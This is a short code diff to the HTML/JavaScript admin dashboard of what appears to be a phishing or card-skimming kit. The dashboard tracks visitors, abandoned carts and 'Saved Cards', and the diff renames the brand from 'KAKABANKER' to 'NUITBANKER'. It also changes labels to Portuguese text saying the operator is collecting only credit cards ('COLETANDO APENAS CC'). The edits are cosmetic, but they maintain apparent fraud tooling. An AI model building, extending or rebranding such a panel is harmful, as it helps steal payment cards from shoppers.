@@ -810,7 +810,7 @@
             <div class="stat-card"><div class="stat-value" id="statOnline">0</div><div class="stat-label">Active Visitors</div></div>
             <div class="stat-card"><div class="stat-value" id="statCarts">0</div><div class="stat-label">Abandoned Carts</div></div>
             <div class="stat-card"><div class="stat-value" id="statCards">0</div><div class="stat-label">Saved Cards</div></div>
-            <div class="stat-card"><div class="stat-value" id="statRevenue">R$ 0</div><div class="stat-label">Total Revenue</div></div>
+            <div class="stat-card"><div class="stat-value" id="statRevenue">R$ 0</div><div class="stat-label">Total Coletado</div></div>
         </div>
 
         <div class="tabs">
@@ -920,7 +920,7 @@
             </div>
         </div>
 
-        <div class="footer">KAKABANKER v2.0 | SECURE ADMIN SYSTEM</div>
+        <div class="footer">NUITBANKER v1 | SECURE ADMIN SYSTEM</div>
     </main>
 </div>
 
@@ -1308,7 +1308,7 @@
             const data = await res.json();
             if (data.success) {
                 document.getElementById('pixKey').value = data.pix_key || '';
-                document.getElementById('pixCodeDisplay').innerHTML = data.pix_key || 'Configure your PIX key below';
+                document.getElementById('pixCodeDisplay').innerHTML = data.pix_key || 'PIX OFF COLETANDO APENAS CC';
             }
         } catch (error) { console.error(error); }
     }
